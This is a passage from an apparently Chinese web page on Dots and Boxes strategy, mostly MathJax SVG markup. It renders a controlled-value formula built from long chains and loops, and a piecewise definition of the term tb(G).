429Z"></path></g></g></g></svg></mjx-container>时，表示可以让格。<br>$$<br>c(G)=size(G)-4<em>longChain-8</em>loops+tb(G)<br>$$</p><p><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="103.986ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 45961.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g><g data-mml-node="mi" transform="translate(361,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(790,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1179,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mo" transform="translate(1965,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2631.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mrow" transform="translate(3687.6,0)"><g data-mml-node="mo"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="mtable" transform="translate(500,0)"><g data-mml-node="mtr"><g data-mml-node="mtd"><g data-mml-node="mn"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(1778,0)"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(783,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1268,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1771,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(3573.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mtd" transform="translate(6851.6,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1009,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1538,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1883,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2483,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(3229.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4285.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mtext" transform="translate(4785.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mn" transform="translate(5035.6,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g><g data-mml-node="mo" transform="translate(5535.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(13665.1,0)"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(783,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1268,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1771,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(3573.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mtd" transform="translate(18738.7,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g><g data-mml-node="mi" transform="translate(433,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(1009,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(1538,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1883,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(2483,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(3229.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(4285.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mtext" transform="translate(4785.6,0)"><path data-c="A0" d=""></path></g><g data-mml-node="mn" transform="translate(5035.6,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g><g data-mml-node="mo" transform="translate(5535.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g></g><g data-mml-node="mtd" transform="translate(25552.2,0)"><g data-mml-node="mi"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(298,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(783,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(1268,0)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g><g data-mml-node="mi" transform="translate(1771,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mo" transform="translate(2517.8,0)"><path data-c="2260" d="M166 -215T159 -215T147 -212T141 -204T139 -197Q139 -190 144 -183L306 133H70Q56 140 56 153Q56 168 72 173H327L406 327H72Q56 332 56 347Q56 360 70 367H426Q597 702 602 707Q605 716 618 716Q625 716 630 712T636 703T638 696Q638 692 471 367H707Q722 359 722 347Q722 336 708 328L451 327L371 173H708Q722 163 722 153Q722 140 707 133H351Q175 -210 170 -212Q166 -215 159 -215Z"></path></g><g data-mml-node="mn" transform="translate(3573.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g><g data-mml-node="mtd" transform="translate(30625.8,0)"><g data-mml-node="mi"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 